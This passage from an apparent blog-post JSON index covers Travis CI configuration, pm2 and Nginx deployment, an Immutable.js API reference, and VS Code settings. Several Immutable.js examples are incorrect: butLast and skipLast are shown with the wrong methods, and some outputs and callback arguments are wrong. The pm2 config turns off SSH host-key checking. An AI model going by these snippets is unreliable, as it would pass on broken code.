obj[key]);&#125;// print: a 1 b 2 c 3//说明：对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。//一种解决方法是，使用Object.keys方法将对象的键名生成一个数组，然后遍历这个数组。// entrieslet arr = ['a', 'b', 'c'];for (let pair of arr.entries()) &#123; console.log(pair);&#125;// [0, 'a']// [1, 'b']// [2, 'c']","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"API","slug":"API","permalink":"https://ru23.com/tags/API/"}]},{"title":"持续集成 Travis CI","slug":"2018-02-travis-ci","date":"2018-02-23T04:12:08.000Z","updated":"2018-10-24T03:46:02.360Z","comments":true,"path":"note/18fb4cf4.html","link":"","permalink":"https://ru23.com/note/18fb4cf4.html","excerpt":"","text":"来源于互联网 一、什么是持续集成？ Travis CI 提供的是持续集成服务（Continuous Integration，简称 CI）。它绑定 Github 上面的项目，只要有新的代码，就会自动抓取。然后，提供一个运行环境，执行测试，完成构建，还能部署到服务器。 持续集成指的是只要代码有变更，就自动运行构建和测试，反馈运行结果。确保符合预期以后，再将新代码”集成”到主干。 持续集成的好处在于，每次代码的小幅变更，就能看到运行结果，从而不断累积小的变更，而不是在开发周期结束时，一下子合并一大块代码 二、.travis.yml Travis 要求项目的根目录下面，必须有一个.travis.yml文件。这是配置文件，指定了 Travis 的行为。该文件必须保存在 Github 仓库里面，一旦代码仓库有新的 Commit，Travis就会去找这个文件，执行里面的命令 这个文件采用 YAML 格式。下面是一个最简单的 Python 项目的.travis.yml文件 12language: pythonscript: true language字段指定了默认运行环境，这里设定使用 Python 环境 script字段指定要运行的脚本，script: true表示不执行任何脚本，状态直接设为成功 面是一个稍微复杂一点的.travis.yml 1234language: pythonsudo: requiredbefore_install: sudo pip install fooscript: py.test 三、运行流程 Travis 的运行流程很简单，任何项目都会经过两个阶段 install 阶段：安装依赖 script 阶段：运行脚本 3.1 install 阶段 install字段用来指定安装脚本 1install: ./install-dependencies.sh 如果有多个脚本，可以写成下面的形式 123install: - command1 - command2 上面代码中，如果command1失败了，整个构建就会停下来，不再往下进行。 如果不需要安装，即跳过安装阶段，就直接设为true。 1install: true 3.2、script 字段 script字段用来指定构建或测试脚本 script: bundle exec thor build 如果有多个脚本，可以写成下面的形式 123script: - command1 - command2 注意，script与install不一样，如果command1失败，command2会继续执行。但是，整个构建阶段的状态是失败。如果command2只有在command1成功后才能执行，就要写成下面这样。 1script: command1 &amp;&amp; command2 3.3 实例：Node 项目 Node 项目的环境需要写成下面这样 123language: node_jsnode_js: - \"8\" 上面代码中，node_js字段用来指定 Node 版本。 Node 项目的install和script阶段都有默认脚本，可以省略 install默认值：npm install script默认值：npm test 3.4 部署 script阶段结束以后，还可以设置通知步骤（notification）和部署步骤（deployment），它们不是必须的 部署的脚本可以在script阶段执行，也可以使用 Travis 为几十种常见服务提供的快捷部署功能。比如，要部署到 Github Pages，可以写成下面这样 123456deploy: provider: pages skip_cleanup: true github_token: $GITHUB_TOKEN # Set in travis-ci.org dashboard on: branch: master 其他部署方式 3.5 钩子方法 Travis 为上面这些阶段提供了7个钩子 before_install：install 阶段之前执行 before_script：script 阶段之前执行 after_failure：script 阶段失败时执行 after_success：script 阶段成功时执行 before_deploy：deploy 步骤之前执行 after_deploy：deploy 步骤之后执行 after_script：script 阶段之后执行 完整的生命周期，从开始到结束是下面的流程 before_install install before_script script aftersuccess or afterfailure [OPTIONAL] before_deploy [OPTIONAL] deploy [OPTIONAL] after_deploy after_script 下面是一个before_install钩子的例子 123before_install: - sudo apt-get -qq update - sudo apt-get install -y libxml2-dev 上面代码表示before_install阶段要做两件事，第一件事是要更新依赖，第二件事是安装libxml2-dev。用到的几个参数的含义如下：-qq表示减少中间步骤的输出，-y表示如果需要用户输入，总是输入yes 3.6 运行状态 最后，Travis 每次运行，可能会返回四种状态 passed：运行成功，所有步骤的退出码都是0 canceled：用户取消执行 errored：before_install、install、before_script有非零退出码，运行会立即停止 failed ：script有非零状态码 ，会继续运行 四、使用技巧4.1 环境变量 .travis.yml的env字段可以定义环境变量,然后，脚本内部就使用这些变量了 1234env: - DB=postgres - SH=bash - PACKAGE_VERSION=\"1.0.*\" 有些环境变量（比如用户名和密码）不能公开，这时可以通过 Travis 网站，写在每个仓库的设置页里面，Travis 会自动把它们加入环境变量。这样一来，脚本内部依然可以使用这些环境变量，但是只有管理员才能看到变量的值,具体操作文档 4.2 加密信息 如果不放心保密信息明文存在 Travis 的网站，可以使用 Travis 提供的加密功能","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"部署","slug":"部署","permalink":"https://ru23.com/tags/部署/"},{"name":"Travis CI","slug":"Travis-CI","permalink":"https://ru23.com/tags/Travis-CI/"}]},{"title":"pm2用法之ecosystem部署nodejs项目","slug":"2018-02-pm2-ecosystem-deploy","date":"2018-02-22T09:12:08.000Z","updated":"2018-10-24T03:46:02.358Z","comments":true,"path":"note/dfae90e4.html","link":"","permalink":"https://ru23.com/note/dfae90e4.html","excerpt":"","text":"一、node项目部署流程 二、配置部署脚本文件 在项目根目录添加pm2的部署脚本文件 ecosystem.json 12345678910111213141516171819202122232425262728&#123; \"apps\": [ \"name\": \"movie\", //对应Nginx上的配置 \"script\": \"app.js\", //入口文件 \"env\": &#123; \"COMON_VARIABLE\": \"true\" &#125;, \"env_production\": &#123; \"NODE_ENV\": \"production\" &#125; ], \"deploy\": &#123; \"production\": &#123; \"user\": \"poetries\", //Nginx服务器上的username \"host\": [\"120.120.14.21\"], // 服务器地址 \"port\": \"3922\", \"ref\": \"origin/master\", //从指定的分支拉取代码 \"repo\": \"git@github.com:poetries/poetries.github.io.git\", \"path\": \"/www/movie/production\",//发布到服务器指定的目录下 \"ssh_options\": \"StrictHostKeyChecking=no\", //构建在发布 \"post-deploy\": \"npm install --registry=https://registry.npm.taobao.org &amp;&amp; grunt build &amp;&amp; pm2 startOrRestart ecosystem.json --env production\", \"env\": &#123; \"NODE_ENV\": \"production\" &#125; &#125; &#125;&#125; 三、配置Nginx的server 在nginx安装目录下的vhost中新建一个xx-3000.conf的配置文件 123456789101112131415161718192021222324upstream movie &#123; // website项目的目录名称 server 127.0.0.1:3000; // 服务器上的本地启动入口&#125;// 配置serverserver &#123; listen 80; server_name movie.poetries.top; //指向的域名 location / &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forward-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; proxy_set_header X-Nginx-Proxy true; proxy_pass http://movie; // 对应上面的目录 proxy_redirect off; &#125; // 处理静态资源 location ~* ^.+\\.(jpg|jpeg|gif|png|ico|css|js|pdf|txt) &#123; root /www/movie/public; //静态资源路径 &#125;&#125; 四、开启防火墙 Ubuntu的设置 打开 sudo vi /etc/iptables.up.rules 生效 sudo iptables-restore &lt; /etc/iptables.up.rules 1234# movie-A INPUT -s 127.0.0.1 -p tcp --destination-port 3001 -m state ESTABLISHED -j ACCEPT-A OUTPUT -s 127.0.0.1 -p tcp --destination-port 3001 -m state ESTABLISHED -j ACCEPT 五、部署命令 pm2 deploy ecosystem.json production setup 初始化 pm2 deploy ecosystem.json production 部署","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://ru23.com/tags/Node/"},{"name":"部署","slug":"部署","permalink":"https://ru23.com/tags/部署/"}]},{"title":"梳理Immutable常用API","slug":"2018-02-immutable-api","date":"2018-02-04T08:10:24.000Z","updated":"2018-10-24T03:46:02.348Z","comments":true,"path":"note/2bcb1a06.html","link":"","permalink":"https://ru23.com/note/2bcb1a06.html","excerpt":"","text":"一、fromJS 作用：是最最常用的将原生JS数据转换为ImmutableJS数据的转换方法,默认将原生JS的Array转为List，Object转为Map 12345678910111213141516171819202122232425262728Immutable.fromJS(&#123; a: &#123; b: [1, 2, 3], c: 40 &#125;&#125;);// 得到Map &#123; \"a\": Map &#123; \"b\": List [1, 2, 3], \"c\": 40 &#125;&#125;// 常见const t1 = Immutable.fromJS(&#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;);console.log(t1);// 不常用const t2 = Immutable.fromJS(&#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;, function(key, value) &#123; // 定制转换方式，下这种就是将Array转换为List，Object转换为Map const isIndexed = Immutable.Iterable.isIndexed(value); return isIndexed ? value.toList() : value.toOrderedMap(); // true, \"b\", &#123;b: [10, 20, 30]&#125; // false, \"a\", &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125; // false, \"\", &#123;\"\": &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;&#125;&#125;);console.log(t2); 二、toJS 作用：将一个Immutable数据转换为JS类型的数据 用法：value.toJS() 三、is 作用：对两个对象进行比较 用法：is(map1,map2) 123456789import &#123; Map, is &#125; from 'immutable'const map1 = Map(&#123; a: 1, b: 1, c: 1 &#125;)const map2 = Map(&#123; a: 1, b: 1, c: 1 &#125;)map1 === map2 //falseObject.is(map1, map2) // falseis(map1, map2) // true 只检测值是否相等 四、List 和 Map4.1 创建 List 有序索引密集的集合，和JS中的Array很像 Map 无序索引集，类似JavaScript中的Object 4.2 判断 List.isList() 和 Map.isMap() 判断一个数据结构是不是List/Map类型 4.3 长度4.3.1 size 获取List/Map的长度**1234567// listconsole.log(List([1,2,3,4]).size);// 4console.log(List.of(1, 2, 3, 4).size);// 4// mapconsole.log(Map(&#123;key: \"value2\", key1: \"value1\"&#125;).size);// 2console.log(Map.of(&#123;x:1&#125;, 2, [3], 4).size);// 2 4.3.2 count()12345678910111213// mapconsole.log(Immutable.fromJS(&#123;key: \"value2\", key1: \"value1\"&#125;).count());// 4// 可以定制条件，来确定大小console.log(Immutable.fromJS(&#123;key: 1, key1: 34&#125;).count((value, key, obj) =&gt; &#123; return value &gt; 3;&#125;));// 1 value大于3的有两个// listconsole.log(Immutable.fromJS([1, 2, 5, 6]).count());// 4// 可以制定条件，来确定 大小console.log(Immutable.fromJS([1, 2, 5, 6]).count((value, index, array) =&gt; &#123; return value &gt; 3;&#125;));// 2 大于3的有两个 4.4 数据读取4.4.1 get() 、 getIn() 获取数据结构中的数据 4.4.2 has() 、 hasIn() 判断是否存在某一个key 123Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).has('0'); //trueImmutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).has('0'); //trueImmutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).hasIn([3,'b']) //true 4.4.3 includes() 判断是否存在某一个value 12345Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).includes(2); //trueImmutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).includes('2'); //false 不包含字符2Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).includes(5); //false Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).includes(&#123;a:4,b:5&#125;) //falseImmutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).includes(Immutable.fromJS(&#123;a:4,b:5&#125;)) //true 4.4.4 first() 、 last() 用来获取第一个元素或者最后一个元素，若没有则返回undefined 12345Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).first()//1Immutable.fromJS([1,2,3,&#123;a:4,b:5&#125;]).last()//&#123;a:4,b:5&#125;Immutable.fromJS(&#123;a:1,b:2,c:&#123;d:3,e:4&#125;&#125;).first() //1Immutable.fromJS(&#123;a:1,b:2,c:&#123;d:3,e:4&#125;&#125;).first() //&#123;d:3,e:4&#125; 4.5 数据修改4.5.1 set() 设置第一层key、index的值 1234567891011/ Map// 将 key 位置的元素替换为 valueconst $obj1 = Map(&#123;a: &#123;a1: 34&#125;, b: 2, c: 3, d: 444&#125;);console.log($obj1.set('a', 0).toJS()); // &#123;a: 0, b: 2, c: 3, d: 444&#125;console.log($obj1.set('e', 99).toJS()); // &#123;a: 1, b: 2, c: 3, d: 444, e: 99&#125;// List// 将 index 位置的元素替换为 value，即使索引越界也是安全的, 空位 undefinedconst $arr1 = List([1, 2, 3]);console.log($arr1.set(-1, 0).toJS()); // [1, 2, 0] 注意-1 等效于 $arr1.set($arr1.size + -1, 0)console.log($arr1.set(4, 0).toJS()); // [ 1, 2, 3, undefined, 0 ] 空位置为了undefined 4.5.2 setIn() 设置深层结构中某属性的值 12345// Mapconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 45, b: 64&#125;]).setIn(['3', 'a'], 1000).toJS());//[1, 2, 3, &#123;a: 1000, b: 64&#125;]// Listconsole.log(Immutable.fromJS([1, 2, 3, &#123;a: 45, b: 64&#125;]).setIn(['3', 'a'], 1000).toJS());//[1, 2, 3, &#123;a: 1000, b: 64&#125;] 4.5.3 deleteIn() 用来删除深层数据，用法参考setIn 4.5.4 更新 update() 对对象中的某个属性进行更新，可对原数据进行相关操作 1234567////Listconst list = List([ 'a', 'b', 'c' ])const result = list.update(2, val =&gt; val.toUpperCase())///Mapconst aMap = Map(&#123; key: 'value' &#125;)const newMap = aMap.update('key', value =&gt; value + value) 4.5.5 clear() 清除所有数据 12Map(&#123; key: 'value' &#125;).clear() //MapList([ 1, 2, 3, 4 ]).clear() // List 4.6 List中的删除与插入4.6.1 数组方法 List对应的数据结构是js中的数组，所以数组的一些方法在Immutable中也是通用的，比如push，pop,shift，unshift，insert push()：在List末尾插入一个元素 pop(): 在List末尾删除一个元素 unshift: 在List首部插入一个元素 shift: 在List首部删除一个元素 insert：在List的index处插入元素 12345List([ 0, 1, 2, 3, 4 ]).insert(6, 5) //List [ 0, 1, 2, 3, 4, 5 ]List([ 1, 2, 3, 4 ]).push(5) // List [ 1, 2, 3, 4, 5 ]List([ 1, 2, 3, 4 ]).pop() // List[ 1, 2, 3 ]List([ 2, 3, 4]).unshift(1) // List [ 1, 2, 3, 4 ]List([ 0, 1, 2, 3, 4 ]).shift() // List [ 1, 2, 3, 4 ] 4.7 关于merge merge 浅合并，新数据与旧数据对比，旧数据中不存在的属性直接添加，旧数据中已存在的属性用新数据中的覆盖 mergrWith 自定义浅合并，可自行设置某些属性的值 mergeIn 对深层数据进行浅合并 mergeDeep 深合并，新旧数据中同时存在的的属性为新旧数据合并之后的数据 mergeDeepIn 对深层数据进行深合并 mergrDeepWith 自定义深合并，可自行设置某些属性的值 这里用一段示例彻底搞懂merge，此示例为Map结构，List与Map原理相同 123456789101112131415const Map1 = Immutable.fromJS(&#123;a:111,b:222,c:&#123;d:333,e:444&#125;&#125;); const Map2 = Immutable.fromJS(&#123;a:111,b:222,c:&#123;e:444,f:555&#125;&#125;); const Map3 = Map1.merge(Map2); //Map &#123;a:111,b:222,c:&#123;e:444,f:555&#125;&#125; const Map4 = Map1.mergeDeep(Map2); //Map &#123;a:111,b:222,c:&#123;d:333,e:444,f:555&#125;&#125; const Map5 = Map1.mergeWith((oldData,newData,key)=&gt;&#123; if(key === 'a')&#123; return 666; &#125;else&#123; return newData &#125; &#125;,Map2); //Map &#123;a:666,b:222,c:&#123;e:444,f:555&#125;&#125; 4.8 序列算法4.8.1 concat() 对象的拼接，用法与js数组中的concat()相同，返回一个新的对象 1const List = list1.concat(list2) 4.8.2 map() 遍历整个对象，对Map/List元素进行操作，返回一个新的对象 12Map(&#123;a:1,b:2&#125;).map(val=&gt;10*val)//Map&#123;a:10,b:20&#125; 4.8.3 mapKey() Map特有的mapKey() 遍历整个对象，对Map元素的key进行操作，返回一个新的对象 12Map(&#123;a:1,b:2&#125;).mapKey(val=&gt;val+'l')//Map&#123;al:10,bl:20&#125; 4.8.4 mapEntries Map特有的mapEntries() 遍历整个对象，对Map元素的key和value同时进行操作，返回一个新的对象。Map的map()也可实现此功能 1234Map(&#123;a:1,b:2&#125;).map((key,val)=&gt;&#123; return [key+'l',val*10]&#125;)//Map&#123;al:10,bl:20&#125; 4.8.5 filter 过滤 filter 返回一个新的对象，包括所有满足过滤条件的元素 还有一个filterNot()方法，与此方法正好相反 1234Map(&#123;a:1,b:2&#125;).filter((key,val)=&gt;&#123; return val == 2&#125;)//Map&#123;b:2&#125; 4.8.6 reverse 作用：将数据的结构进行反转 123Immutable.fromJS([1, 2, 3, 4, 5]).reverse(); // List [5,4,3,2,1]Immutable.fromJS(&#123;a:1,b:&#123;c:2,d:3&#125;,e:4&#125;).recerse();//Map &#123;e:4,b:&#123;c:2,d:3&#125;,a:1&#125; 4.8.7 sort &amp; sortBy 排序 sort &amp; sortBy 作用：对数据结构进行排序 1234567891011121314151617181920212223242526272829303132///ListImmutable.fromJS([4,3,5,2,6,1]).sort()// List [1,2,3,4,5,6]Immutable.fromJS([4,3,5,2,6,1]).sort((a,b)=&gt;&#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;)// List [1,2,3,4,5,6]Immutable.fromJS([&#123;a:3&#125;,&#123;a:2&#125;,&#123;a:4&#125;,&#123;a:1&#125;]).sortBy((val,index,obj)=&gt;&#123; return val.get('a')&#125;,(a,b)=&gt;&#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;)//List [ &#123;a:3&#125;, &#123;a:2&#125;, &#123;a:4&#125;, &#123;a:1&#125; ]//MapImmutable.fromJS( &#123;b:1, a: 3, c: 2, d:5&#125; ).sort()//Map &#123;b: 1, c: 2, a: 3, d: 5&#125;Immutable.fromJS( &#123;b:1, a: 3, c: 2, d:5&#125; ).sort((a,b)=&gt;&#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; if (a === b) &#123; return 0; &#125;&#125;)//Map &#123;b: 1, c: 2, a: 3, d: 5&#125;Immutable.fromJS( &#123;b:1, a: 3, c: 2, d:5&#125; ).sortBy((value, key, obj)=&gt; &#123; return value&#125;)//Map &#123;b: 1, c: 2, a: 3, d: 5&#125; 4.8.8 groupBy 分组 groupBy 作用：对数据进行分组 12345678910111213const listOfMaps = List([ Map(&#123; v: 0 &#125;), Map(&#123; v: 1 &#125;), Map(&#123; v: 1 &#125;), Map(&#123; v: 0 &#125;), Map(&#123; v: 2 &#125;)])const groupsOfMaps = listOfMaps.groupBy(x =&gt; x.get('v'))// Map &#123;// 0: List [ Map&#123; \"v\": 0 &#125;, Map &#123; \"v\": 0 &#125; ],// 1: List [ Map&#123; \"v\": 1 &#125;, Map &#123; \"v\": 1 &#125; ],// 2: List [ Map&#123; \"v\": 2 &#125; ],// &#125; 4.9 查找数据4.9.1 indexOf lastIndexOf Map不存在此方法 和js数组中的方法相同，查找第一个或者最后一个value的index值，找不到则返回-1 12Immutable.fromJS([1,2,3,4]).indexof(3) //2Immutable.fromJS([1,2,3,4]).lastIndexof(3) //2 4.9.2 findIndex() 、 findLastIndex() Map不存在此方法,查找满足要求的元素的index值 123456Immutable.fromJS([1,2,3,4]).findIndex((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // 1Immutable.fromJS([1,2,3,4]).findLastIndex((value,index,array)=&gt;&#123; return index%2 === 0;&#125;) // 3 4.9.3 find() 、 findLast() 查找满足条件的元素的value值 1234567Immutable.fromJS([1,2,3,4]).find((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // 2Immutable.fromJS([1,2,3,4]).findLast((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // 4 4.9.4 findKey() 、 findLastKey() 查找满足条件的元素的key值 1234567Immutable.fromJS([1,2,3,4]).findKey((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // 1Immutable.fromJS([1,2,3,4]).findLastKey((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // 3 4.9.5 findEntry() 、 findLastEntry() 查找满足条件的元素的键值对 key:value 1234567Immutable.fromJS([1,2,3,4]).findEntry((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // [1,2]Immutable.fromJS([1,2,3,4]).findLastEntry((value,index,array)=&gt;&#123; return value%2 === 0;&#125;) // [3,4] 4.9.6 keyOf() lastKeyOf() 查找某一个value对应的key值 12Immutable.fromJS([1,2,3,4]).keyOf(2) //1Immutable.fromJS([1,2,3,4]).lastKeyOf(2) //1 4.9.7 max() 、 maxBy() 查找最大值 12345Immutable.fromJS([1, 2, 3, 4]).max() //4Immutable.fromJS([&#123;a;1&#125;,&#123;a:2&#125;,&#123;a: 3&#125;,&#123;a:4&#125;]).maxBy((value,index,array)=&gt;&#123; return value.get('a')&#125;) //&#123;a:4&#125; 4.9.8 min() 、 minBy() 查找最小值 12345Immutable.fromJS([1, 2, 3, 4]).min() //1Immutable.fromJS([&#123;a;1&#125;,&#123;a:2&#125;,&#123;a: 3&#125;,&#123;a:4&#125;]).minBy((value,index,array)=&gt;&#123; return value.get('a')&#125;) //&#123;a:1&#125; 4.10 创建子集4.10.1 slice() 和原生js中数组的slice数组一样，包含两个参数，start和end，start代表开始截取的位置，end代表结束的位置，不包括第end的元素。若不包括end，则返回整个对象，若end为负数，则返回（start，length-end）对应的数据。若start只有一个并且为负数，则返回最后的end个元素 1234Immutable.fromJS([1, 2, 3, 4]).slice(0); //[1,2,3,4]Immutable.fromJS([1, 2, 3, 4]).slice(0,2); //[1,2]Immutable.fromJS([1, 2, 3, 4]).slice(-2); //[3,4]Immutable.fromJS([1, 2, 3, 4]).slice(0,-2); //[1,2] 4.10.2 rest() 返回除第一个元素之外的所有元素 1Immutable.fromJS([1, 2, 3, 4]).rest()//[2,3,4] 4.10.3butLast() 返回除最后一个元素之外的所有元素 1Immutable.fromJS([1, 2, 3, 4]).rest()//[1,2,3] 4.10.4 skip() 有一个参数n, 返回截掉前n个元素之后剩下的所有元素 1Immutable.fromJS([1, 2, 3, 4]).skip(1)//[2,3,4] 4.10.5 skipLast() 有一个参数n, 返回截掉最后n个元素之后剩下的所有元素 1Immutable.fromJS([1, 2, 3, 4]).skip(1)//[1,2,3] 4.10.6 skipWhile() 返回从第一次返回false之后的所有元素 1234Immutable.fromJS([1, 2, 3, 4]).skipWhile(list.skipWhile((value,index,list)=&gt;&#123; return value &gt; 2;&#125;))// [1,2,3,4]skipUntil() 4.10.7 take() 有一个参数n, 返回前n个元素 1Immutable.fromJS([1, 2, 3, 4]).take(2)//[1,2] 4.10.8 takeLast() 有一个参数n, 返回最后n个元素 1Immutable.fromJS([1, 2, 3, 4]).takeLast(2)//[3,4] 4.10.9 takeWhile() 返回从第一次返回false之前的所有元素 1234Immutable.fromJS([1, 2, 3, 4]).skipWhile(list.takeWhile((value,index,list)=&gt;&#123; return value &gt; 2;&#125;))// []takeUntil() 4.11 处理数据4.11.1 reduce() 和js中数组中的reduce相同,按索引升序的顺序处理元素 12345Immutable.fromJS([1,2,3,4]).reduce((pre,next,index,arr)=&gt;&#123; console.log(pre+next) return pre+next; &#125;)// 3 6 10 4.11.2 reduceRight() 和js中数组中的reduce相同,按索引降序的顺序处理元素 12345Immutable.fromJS([1,2,3,4]).reduceRight((pre,next,index,arr)=&gt;&#123; console.log(pre+next) return pre+next; &#125;)// 7 9 10 4.11.3 every() 作用：判断整个对象总中所有的元素是不是都满足某一个条件，都满足返回`true，反之返回false 123Immutable.fromJS([1,2,3,4]).every((value,index,arr)=&gt;&#123; return value &gt; 2&#125;) // false 4.11.4 some() 判断整个对象总中所有的元素是不是存在满足某一个条件的元素，若存在返回true，反之返回false 123Immutable.fromJS([1,2,3,4]).some((value,index,arr)=&gt;&#123; return value &gt; 2&#125;) // true 4.11.5 join() 作用：同js中数组的join方法。把转换为字符串 1Immutable.fromJS([1,2,3,4]).join(',') //1,2,3,4 4.11.6 isEmpty() 作用：判断是否为空 123Immutable.fromJS([]).isEmpty(); // trueImmutable.fromJS(&#123;&#125;).isEmpty(); // truecount() 4.11.7 countBy() 与count不同的是，countBy返回一个对象 12345678910const list = Immutable.fromJS([1,2,3,4]);const map = Immutable.fromJS(&#123;a:1,b:2,c:3,d:4&#125;);list.countBy((value,index,list)=&gt;&#123; return value &gt; 2;&#125; //&#123;false: 2, true: 2&#125;map.countBy((value,index,list)=&gt;&#123; return value &gt; 2;&#125; //&#123;false: 2, true: 2&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"},{"name":"Immutable","slug":"Immutable","permalink":"https://ru23.com/tags/Immutable/"}]},{"title":"VS Code折腾记","slug":"2018-02-vsc-config","date":"2018-02-02T03:40:43.000Z","updated":"2018-10-24T03:46:02.362Z","comments":true,"path":"note/dde95dab.html","link":"","permalink":"https://ru23.com/note/dde95dab.html","excerpt":"","text":"VS Code常用插件 Auto Close Tag （自动关闭HTML标签） Auto Rename Tag (HTML标签自动改名) Babel ES6/ES7 Beautify css/sass/scss/less Brackets Light (主题) Complete JSDoc Tags (js文档注释提示) Git History (查看git提交记录) HTML CSS Support (HTML中提示可用的class) npm Intellisense (提示可以require的模块名称) One Dark Theme (主题) Path Intellisense (路径补全) Reactjs code snippets (reactjs代码提示) Sass SCSS IntelliSense Preview SCSS智能提醒，配置强大 Sublime Babel VSCode Great Icons (文件图标) vscode-icons （文件图标） Beautify - HTML、CSS、JS、JSON语法高亮 Guides - 代码对齐辅助线 OneDark主题 JavaScript (ES6) Code Snippets (代码片段插件) Project Manager (项目管理器插件) 简单的项目管理器,可以在你的编辑器中快速切换项目 Sync Settings (设置同步插件)在电脑上移植你的插件和设置是轻而易举的事 Git History (Git 历史记录插件) 可视化的 Git 历史记录插件 Document This (JSDoc注释插件) npm Intellisense (npm 模块导入插件) Align (代码对齐插件) amVim (vim 插件) Faker 可以生成随机的名称，地址，图像，电话号码 Color Info 颜色信息及转换 SVG Viewer SVG预览 TODO Highlight TODO 高亮 Minify 代码压缩 Regex Previewer 正则表达式预览 File Tree View 提供几个常见编程语言的函数或状态的树集合展示,可以快速点击跳转! JavaScript Test Runner Preview 快速执行单元测试,支持 Mocha 和 Jest NPM-Scripts 在侧边栏可视化执行 npm 命令(项目内的 package.json) colorize会给颜色代码增加一个当前匹配代码颜色的背景 vscode-fake——生成各种假数据类型。（姓名，电话） vscode-CSS Peek——class类定义跳转 vscode-Git Lens—–增强vscode的git管理工具 vscode-Live Server—–http服务器（相当于使用nodejs的http-server ） EditorConfig for VS Code EditorConfig 插件 Emoji 在代码中输入emoji File Peek 根据路径字符串，快速定位到文件 Font-awesome codes for html FontAwesome提示代码段 Guides 高亮缩进基准线 JavaScript (ES6) code snippets ES6语法代码段 language-stylus Stylus语法高亮和提示 Lodash Lodash代码段 Prettify JSON 格式化JSON Test Spec Generator 测试用例生成（支持chai、should、jasmine） vetur 目前比较好的Vue语法高亮 cssrem css值转rem插件 polacode 代码截图工具 配置1234567891011121314151617181920212223242526272829303132333435363738394041&#123; \"workbench.activityBar.visible\": true, \"workbench.iconTheme\": \"vscode-icons\", \"window.menuBarVisibility\": \"default\", \"editor.minimap.enabled\": true, \"cssrem.rootFontSize\": 75, \"workbench.colorTheme\": \"Atom One Dark\", \"editor.fontSize\": 16, \"liveServer.settings.donotShowInfoMsg\": true, \"editor.cursorStyle\": \"block\", \"editor.fontFamily\": \"Fira Code\", \"editor.fontLigatures\": true, \"editor.lineHeight\": 24, \"editor.lineNumbers\": \"on\", \"editor.rulers\": [ 120 ], \"auto-close-tag.SublimeText3Mode\": true, \"vsicons.dontShowNewVersionMessage\": true, \"[javascript]\": &#123; &#125;, \"window.zoomLevel\": 0, \"javascript.implicitProjectConfig.experimentalDecorators\": true, \"Scss2Css.compileAfterSave\": true, \"fileheader.Author\": \"poetryxie\", \"fileheader.LastModifiedBy\": \"poetryxie\", \"todohighlight.isEnable\": false, \"workbench.startupEditor\": \"newUntitledFile\", \"explorer.confirmDragAndDrop\": false, \"gitlens.advanced.messages\": &#123; \"suppressCommitHasNoPreviousCommitWarning\": false, \"suppressCommitNotFoundWarning\": false, \"suppressFileNotUnderSourceControlWarning\": false, \"suppressGitVersionWarning\": false, \"suppressLineUncommittedWarning\": false, \"suppressNoRepositoryWarning\": false, \"suppressUpdateNotice\": false, \"suppressWelcomeNotice\": true &#125;&#125; 字体美化下载链接 https://pan.baidu.com/s/1jJHRgF0","categories":[{"name":"Tools","slug":"Tools","permalink":"https://ru23.com/categories/Tools/"}],"tags":[{"name":"VS Code","slug":"VS-Code","permalink":"https://ru23.com/tags/VS-Code/"}]},{"title":"JavaScript工程项目的一系列最佳实践","slug":"2018-01-js-perfect-rules","date":"2018-01-28T12:36:43.000Z","updated":"2018-10-24T09:32:34.188Z","comments":true,"path":"note/1adc5a41.html","link":"","permalink":"https://ru23.com/note/1adc5a41.html","excerpt":"","text":"来源于互联网 1.Git1.1 一些Git规则 这里有一套规则要牢记 在功能分支中执行开发工作 因为这样，所有的工作都是在专用的分支而不是在主分支上隔离完成的。它允许您提交多个 pull request 而不会导致混乱。您可以持续迭代提交，而不会使得那些很可能还不稳定而且还未完成的代码污染 master 分支 从 develop 独立出分支 这样，您可以保持 master 分支中的代码稳定性，这样就不会导致构建问题，并且几乎可以直接用于发布 永远也不要将分支（直接）推送到 develop 或者 master，请使用合并请求（Pull Request） 通过这种方式，它可以通知整个团队他们已经完成了某个功能的开发。这样开发伙伴就可以更容易对代码进行 code review，同时还可以互相讨论所提交的需求功能 在推送所开发的功能并且发起合并请求前，请更新您本地的develop分支并且完成交互式变基操作（interactive rebase） ebase 操作会将（本地开发分支）合并到被请求合并的分支（ master 或 develop ）中，并将您本地进行的提交应用于所有历史提交的最顶端，而不会去创建额外的合并提交（假设没有冲突的话），从而可以保持一个漂亮而干净的历史提交记录 请确保在变基并发起合并请求之前解决完潜在的冲突 